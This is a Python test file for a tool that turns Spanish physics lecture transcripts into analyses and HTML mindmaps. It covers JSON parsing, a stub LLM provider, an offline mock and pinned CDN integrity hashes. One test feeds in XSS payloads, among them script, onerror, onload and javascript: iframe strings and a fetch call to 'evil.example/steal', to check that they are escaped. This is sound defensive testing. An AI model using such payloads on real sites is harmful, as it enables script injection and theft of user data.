"""
Tests for LLM Providers, schema parsing, and HTML XSS sanitization.
"""

from pathlib import Path
from src.analysis.segment_analyzer import SegmentAnalyzer
from src.providers.base import LLMProvider
from src.providers.offline_mock import OfflineMockProvider
from src.segmentation.chunker import ClassChunk
from src.visualization.mindmap import MindmapGenerator


class StubLLMProvider(LLMProvider):
    """Minimal deterministic LLMProvider double that exercises the real JSON parsing pipeline."""

    def __init__(self, canned_response: str) -> None:
        self.canned_response = canned_response
        self.calls = []

    def analyze(self, prompt: str, context: str) -> str:
        self.calls.append((prompt, context))
        return self.canned_response


def test_clean_and_parse_json():
    raw_markdown = """
    Aquí está el resultado:
    ```json
    {
      "topic": "Efecto Fotoeléctrico",
      "valid": true
    }
    ```
    Espero te sirva.
    """
    parsed = LLMProvider._clean_and_parse_json(raw_markdown)
    assert parsed["topic"] == "Efecto Fotoeléctrico"
    assert parsed["valid"] is True


def test_segment_analyzer_with_stub_llm_provider():
    raw_llm_output = """```json
    {
      "topics": ["Radiación de Cuerpo Negro"],
      "key_concepts": [
        {
          "title": "Ley de Wien",
          "explanation": "Desplazamiento del máximo espectral con la temperatura.",
          "importance": "IMPRESCINDIBLE"
        }
      ],
      "equations": [
        {
          "name": "Ley de desplazamiento de Wien",
          "latex": "\\\\lambda_{max} T = b",
          "variables": "T: temperatura absoluta",
          "when_to_use": "Cuerpo negro en equilibrio térmico"
        }
      ],
      "problems": []
    }
    ```"""
    stub = StubLLMProvider(raw_llm_output)
    analyzer = SegmentAnalyzer(provider=stub)
    chunks = [
        ClassChunk(
            chunk_id=1,
            start=0.0,
            end=300.0,
            start_str="00:00",
            end_str="05:00",
            duration_minutes=5.0,
            text="Clase sobre cuerpo negro.",
            raw_segments_count=1,
            context_prefix="",
        )
    ]
    analyzed = analyzer.analyze_all(chunks)

    assert len(stub.calls) == 1
    assert len(analyzed) == 1
    assert analyzed[0]["topics"] == ["Radiación de Cuerpo Negro"]
    assert analyzed[0]["key_concepts"][0]["title"] == "Ley de Wien"
    assert analyzed[0]["chunk_id"] == 1


def test_mindmap_html_escapes_xss_payloads_and_enforces_strict_mermaid(tmp_path: Path):
    malicious_title = 'Física <script>alert("xss-title")</script>'
    malicious_concepts = [
        {
            "title": '<img src=x onerror=alert("xss-concept")>',
            "explanation": '<script>fetch("https://evil.example/steal")</script>',
            "importance": 'IMPRESCINDIBLE"><script>alert(1)</script>',
        }
    ]
    malicious_equations = [
        {
            "name": 'Ecuación <script>alert("eq")</script>',
            "latex": "E = mc^2",
            "variables": '<svg onload=alert("vars")>',
            "when_to_use": "Siempre",
        }
    ]
    malicious_problems = [
        {
            "title": 'Problema <iframe src="javascript:alert(1)">',
            "type": 'Directo',
            "physical_phenomenon": '<script>alert("phenom")</script>',
            "equations_used": "E = hf",
            "general_procedure": ['Paso 1 <script>alert("step")</script>'],
        }
    ]
    mermaid_code = MindmapGenerator.generate_mermaid(
        class_title=malicious_title,
        topics=['Tema <script>alert("topic")</script>'],
        concepts=malicious_concepts,
        equations=malicious_equations,
        problems=malicious_problems,
    )
    out_file = tmp_path / "mapa_xss_test.html"
    MindmapGenerator.generate_html(
        class_title=malicious_title,
        mermaid_code=mermaid_code,
        synthesis={
            "executive_summary": 'Resumen <script>alert("summary")</script>',
            "core_concepts": malicious_concepts,
        },
        equations=malicious_equations,
        problems=malicious_problems,
        output_file=out_file,
    )

    rendered = out_file.read_text(encoding="utf-8")
    assert '<script>alert(' not in rendered
    assert '<img src=x onerror=' not in rendered
    assert '<svg onload=' not in rendered
    assert '<iframe ' not in rendered
    assert "&lt;script&gt;alert(" in rendered
    assert "securityLevel: 'strict'" in rendered
    assert 'crossorigin="anonymous"' in rendered
    assert 'integrity="sha384-' in rendered


def test_offline_mock_provider():
    provider = OfflineMockProvider()
    context = (
        "[12:15] Andrés Arias: El efecto fotoeléctrico explica que K_max = hf - W. "
        "Dos haces con longitudes de onda de 80 nm y 110 nm con energías cinéticas de 11.39 eV y 7.154 eV. "
        "Estimamos la constante de Planck."
    )
    result = provider.analyze_json("segment_analysis: analiza este segmento", context)
    assert "topics" in result
    assert "equations" in result
    assert "problems" in result
    assert len(result["equations"]) >= 1
    assert len(result["problems"]) >= 1
    assert "LaTeX" in str(result) or "latex" in str(result)


def test_cdn_scripts_use_valid_pinned_sri_hashes(tmp_path: Path):
    """SRI values must be real SHA-384 digests of the pinned CDN files.

    Hashes were computed from the published npm tarballs (jsDelivr serves them byte-for-byte):
      openssl dgst -sha384 -binary package/dist/mermaid.min.js | base64
    A malformed or invented hash makes the browser silently refuse the script.
    """
    import base64
    import re

    expected = {
        "mermaid@10.9.1/dist/mermaid.min.js":
            "sha384-WmdflGW9aGfoBdHc4rRyWzYuAjEmDwMdGdiPNacbwfGKxBW/SO6guzuQ76qjnSlr",
        "mathjax@3.2.2/es5/tex-mml-chtml.js":
            "sha384-Wuix6BuhrWbjDBs24bXrjf4ZQ5aFeFWBuKkFekO2t8xFU0iNaLQfp2K6/1Nxveei",
    }

    out_file = tmp_path / "mapa_sri.html"
    MindmapGenerator.generate_html(
        class_title="SRI",
        mermaid_code="graph TD; A-->B",
        synthesis={"executive_summary": "", "core_concepts": []},
        equations=[],
        problems=[],
        output_file=out_file,
    )
    rendered = out_file.read_text(encoding="utf-8")

    for script_path, sri in expected.items():
        pattern = re.escape(script_path) + r'"\s+integrity="([^"]+)"'
        match = re.search(pattern, rendered)
        assert match, f"missing integrity attribute for {script_path}"
        assert match.group(1) == sri

        digest = base64.b64decode(sri.split("-", 1)[1], validate=True)
        assert len(digest) == 48, "SHA-384 digests are 48 bytes"
